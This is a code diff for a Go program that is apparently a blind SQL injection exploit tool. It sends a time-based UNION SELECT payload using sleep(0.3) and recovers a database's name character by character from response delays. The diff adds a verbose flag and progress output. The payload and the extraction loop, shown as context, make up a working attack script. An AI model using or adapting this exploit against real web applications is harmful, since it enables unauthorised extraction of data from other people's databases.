@@ -1,6 +1,7 @@
 package main
 
 import (
+	"flag"
 	"fmt"
 	"log"
 	"net/http"
@@ -15,6 +16,7 @@ var Magenta = "\033[35m"
 var Green = "\033[32m"
 var Yellow = "\033[33m"
 var EndColor = "\033[0m"
+var verbosePtr *bool
 
 var Strings = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()*+,-./:;<=>?@[]^_`{|}~"
 
@@ -48,7 +50,7 @@ func makeRequest(payload string) {
 
 func handle() {
 	databaseName := exploitDatabase("' or 1=1 union select 1, 2, if(substring((select database()), '{index}', 1)='{value}' , sleep(0.3), NULL), 4, 5, 6; #")
-	fmt.Printf("%v[✔] Database's name found: %v\n", Green, databaseName)
+	fmt.Printf("%v\n[✔] Database's name found: %v\n", Green, databaseName)
 
 }
 
@@ -69,9 +71,11 @@ func exploitDatabase(payload string) string {
 
 			elapsed := final.Sub(start)
 
-			// fmt.Println(payloadFormatted)
+			fmt.Printf("%v \rTesting: %v %v", Red, string(current_value), EndColor)
 
-			fmt.Printf("%v Testing: %v %v\n", Red, string(current_value), EndColor)
+			if *verbosePtr {
+				fmt.Printf("Payload: %v %v %v\n", Magenta, string(payloadFormatted), EndColor)
+			}
 
 			total_strings_verified++
 			if elapsed >= 300*time.Millisecond {
@@ -93,5 +97,7 @@ func exploitDatabase(payload string) string {
 }
 
 func main() {
+	verbosePtr = flag.Bool("v", false, "verbose mode")
+	flag.Parse()
 	handle()
 }
